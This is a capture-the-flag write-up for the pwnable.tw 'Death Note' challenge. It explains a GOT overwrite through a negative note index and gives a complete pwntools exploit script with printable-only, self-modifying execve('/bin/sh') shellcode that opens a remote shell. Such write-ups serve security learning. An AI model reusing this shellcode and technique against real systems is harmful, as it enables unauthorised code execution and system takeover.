# Death Note
> LongChampion, 23/03/2020

## Ideal
After "a few hours" with IDA, we will see this challenge is quite simple: We need to write a shellcode containing printable character only and having at most 80 characters. Then we use negative index to overwrite some `GOT` entries (make it point to your shellcode instead of point to function in libc). Fortunately, `heap` section is mark as `rwx` for easy exploitation.

Oke, search Google for some available shellcode, or use this [tool](https://github.com/VincentDary/PolyAsciiShellGen) to creat your own.

If there is no shellcode satisfy , we need to add some conditions. The shellcode used in the solution below is found in Internet: it contains only printable character and can change itself to spawn a shell. It is fucking short, too!. The only restriction here is that it need `$eax` point to the shellcode itself when executing. After trying a few time, we see that only `free` function have `$eax` point to its argument when called. So we need to overwrite `free@got` (at index -19) with address of our shellcode.

## Final Solution
```python
#!/usr/bin/env python2

from pwn import *

conn = connect('chall.pwnable.tw', 10201)


def connRead():
    sleep(1)
    read = conn.read()
    print read,
    return read


def connSendRaw(s):
    conn.send_raw(s)
    print s,


# +0
shellcode = asm('push 0x70707070')
shellcode += asm('push 0x70707070')
shellcode += asm('pop ecx')
shellcode += asm('sub byte ptr[eax + 36], cl')
shellcode += asm('sub byte ptr[eax + 45], cl')
shellcode += asm('sub byte ptr[eax + 47], cl')
shellcode += asm('sub byte ptr[eax + 49], cl')
shellcode += asm('sub dword ptr[eax + 51], ecx')
shellcode += asm('sub byte ptr[eax + 55], cl')
shellcode += asm('sub byte ptr[eax + 55], cl')
# +32
# the following shellcode is
#
# shellcode = asm('push 0x%08x' % unpack('/sh\x00', 32))
# shellcode += asm('push 0x%08x' % unpack('/bin', 32))
# shellcode += asm('push esp')
# shellcode += asm('pop ebx')
# shellcode += asm('xor ecx, ecx')
# shellcode += asm('xor edx, edx')
# shellcode += asm('xor esi, esi')
# shellcode += asm('xor eax, eax')
# shellcode += asm('mov al, SYS_execve')
# shellcode += asm('int 0x80')
shellcode += '\x68\x2f\x73\x68' # +36
shellcode += '\x70' # +37
shellcode += '\x68\x2f\x62\x69\x6e\x54\x5b\x31' # +45
shellcode += '\x39' # +46
shellcode += '\x31' # +47
shellcode += '\x42' # +48
shellcode += '\x31' # +49
shellcode += '\x66' # +50
shellcode += '\x31' # +51
shellcode += '\x30\x21\x7c\x3d' # +55
shellcode += '\x60'

connRead()
connSendRaw('1\n')      # add note
connRead()
connSendRaw('-19\n')    # input index
connRead()
connSendRaw(shellcode + '\n')   # set content

connRead()
connSendRaw('3\n')      # delete note
connRead()
connSendRaw('-19\n')    # input index

conn.interactive()  # you will get shell here
```
